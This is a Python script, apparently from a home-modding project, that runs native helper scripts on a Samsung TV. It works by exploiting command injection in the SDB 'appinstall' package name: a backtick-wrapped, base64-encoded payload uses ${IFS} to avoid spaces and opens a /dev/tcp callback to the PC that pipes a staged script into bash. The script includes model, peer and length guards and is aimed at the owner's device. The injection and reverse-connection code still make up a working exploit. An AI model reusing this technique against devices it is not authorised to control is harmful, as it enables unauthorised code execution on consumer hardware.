"""Stage and run the native Home helper on the TV via SDB package-name injection.
Adapted from CleanFrame (Nathan Clark, MIT) for Kunal's UA43DU7660KLXL.
Requires: device.json, compiled CleanFrameHomeControl.* in .local/native-home/out/,
and original.json for apply/restore. Runs from the Windows PC that can reach the TV.
"""
from pathlib import Path
import sys, base64, ipaddress, json, os, socket, subprocess, time, uuid

r = Path(__file__).resolve().parents[2]
d = r / '.local/native-home'
mode = sys.argv[1] if len(sys.argv) > 1 else 'query'
if mode not in ['query', 'apply', 'restore', 'inspect']:
    raise SystemExit('Unknown action: use query|apply|restore|inspect')

device = json.loads((r / '.local/device.json').read_text())
host = device['host']
ipaddress.ip_address(host)
allowed_models = set(device.get('allowed_models') or [device.get('model')])
# Optional soft model check via REST if the TV's remote API is up
try:
    import urllib.request
    with urllib.request.urlopen('http://' + host + ':8001/api/v2/', timeout=4) as response:
        info = json.load(response)
    model = info.get('device', {}).get('modelName')
    if model and allowed_models and model not in allowed_models:
        raise SystemExit('Model guard failed (%s); nothing staged.' % model)
except SystemExit:
    raise
except Exception as e:
    print('Note: could not confirm model via :8001 (%s); continuing with SDB-only.' % e)

sdb = device.get('sdb') or 'sdb'
serial = host + ':26101'

def run(args, timeout=30):
    p = subprocess.run([sdb, *args], capture_output=True, text=True, timeout=timeout)
    if p.returncode:
        raise RuntimeError('SDB transport failed: ' + (p.stdout or '')[-300:] + (p.stderr or '')[-300:])
    return p

run(['connect', serial])
# Re-stage reviewed helper files on each run so rollback survives SDK temporary-file cleanup.
for suffix in ['dll', 'runtimeconfig.json', 'deps.json']:
    source = d / 'out' / ('CleanFrameHomeControl.' + suffix)
    if not source.exists():
        if mode == 'inspect':
            continue  # inspect.sh does not need the helper
        raise SystemExit('Missing compiled helper: ' + str(source))
    run(['-s', serial, 'push', str(source), '/home/owner/share/tmp/sdk_tools/CleanFrameHomeControl.' + suffix])
if mode in ['apply', 'restore']:
    baseline = d / 'original.json'
    if not baseline.exists():
        raise SystemExit('Missing original.json baseline')
    run(['-s', serial, 'push', str(baseline), '/home/owner/share/tmp/sdk_tools/CleanFrameHomeOriginal.json'])

token = uuid.uuid4().hex[:12]
remote = '/home/owner/share/tmp/sdk_tools/cfhi-' + token + '.sh'
# Normalise line endings first: a Windows checkout (core.autocrlf) turns the .sh files into CRLF,
# which makes bash on the TV fail with "$'\r': command not found".
d.mkdir(parents=True, exist_ok=True)
sh_bytes = (r / 'scripts/native-home' / (mode + '.sh')).read_bytes().replace(b'\r\n', b'\n').replace(b'\r', b'\n')
staged = d / ('_push_' + mode + '.sh')
staged.write_bytes(sh_bytes)
run(['-s', serial, 'push', str(staged), remote])

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
    route.connect((host, 9))
    local = route.getsockname()[0]
with socket.socket() as listener:
    listener.bind((local, 0))
    listener.listen(1)
    listener.settimeout(18)
    port = listener.getsockname()[1]
    command = 'exec 3<>/dev/tcp/' + local + '/' + str(port) + ';cat ' + remote + '|bash >&3 2>&3;exec 3>&-'
    script = '/bin/mkdir /tmp/s-' + token + ' 2>/dev/null&&{ ' + command + ';}'
    encoded = base64.b64encode(script.encode()).decode()
    name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
    argument = '0 appinstall tpk ' + name
    if len(argument.encode()) > 400:
        raise SystemExit('Command exceeds reviewed transport length; not executed.')
    proc = subprocess.Popen([sdb, '-s', serial, 'shell', argument], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        connection, peer = listener.accept()
        if peer[0] != host:
            raise RuntimeError('Unexpected callback peer; no data accepted.')
        chunks = []
        with connection:
            connection.settimeout(8)
            while True:
                chunk = connection.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(map(len, chunks)) > 100000:
                    raise RuntimeError('Unexpectedly large diagnostic output.')
        output = b''.join(chunks).decode(errors='replace')
        try:
            stdout, stderr = proc.communicate(timeout=8)
        except subprocess.TimeoutExpired:
            proc.terminate()
            stdout, stderr = proc.communicate(timeout=3)
        d.mkdir(parents=True, exist_ok=True)
        (d / (mode + '-output.txt')).write_text(output)
        (d / (mode + '-transport.json')).write_text(json.dumps({
            'returncode': proc.returncode, 'stdout': stdout, 'stderr': stderr,
            'remote_probe': remote, 'time': time.time()
        }, indent=2))
        if 'CLEANFRAME_HOME_INSPECT_BEGIN' not in output or 'CLEANFRAME_HOME_INSPECT_END' not in output:
            raise RuntimeError('Probe incomplete; device state is unknown. Inspect current values before retrying.')
        print(output)
    finally:
        if proc.poll() is None:
            proc.terminate()
            proc.communicate(timeout=3)
